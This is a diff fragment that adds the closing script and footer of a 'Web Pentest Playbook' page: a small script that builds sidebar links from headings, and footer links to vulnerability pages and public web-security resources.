+document.querySelectorAll('[id]:not(sidebar):not(main)').forEach(el => {
+  if (el.tagName.match(/^H[1-6]$/)) {
+    const a = document.createElement('a');
+    a.href = '#' + el.id;
+    a.textContent = el.textContent;
+    if (el.id === 'analogy') {
+      sidebarNav.appendChild(a);
+      sidebarNav.appendChild(methodLink);
+    } else {
+      sidebarNav.appendChild(a);
+    }
+  }
+});
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
